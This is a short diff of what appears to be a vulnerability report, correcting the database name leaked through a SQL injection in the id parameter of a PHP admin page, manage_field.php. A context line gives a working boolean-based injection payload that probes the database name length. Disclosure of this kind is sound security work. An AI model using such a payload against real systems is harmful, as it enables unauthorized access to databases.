@@ -8,7 +8,7 @@ Vulnerability File: /psrs/admin/fields/manage_field.php?id=
 
 Vulnerability location: /psrs/admin/fields/manage_field.php?id=, id
 
-Current database name: hsrs_db ,length is 7
+Current database name: psrs_db ,length is 7
 
 [+] Payload: /psrs/admin/fields/manage_field.php?id=1%27%20and%20length(database())%20=7--+ // Leak place ---> id
 
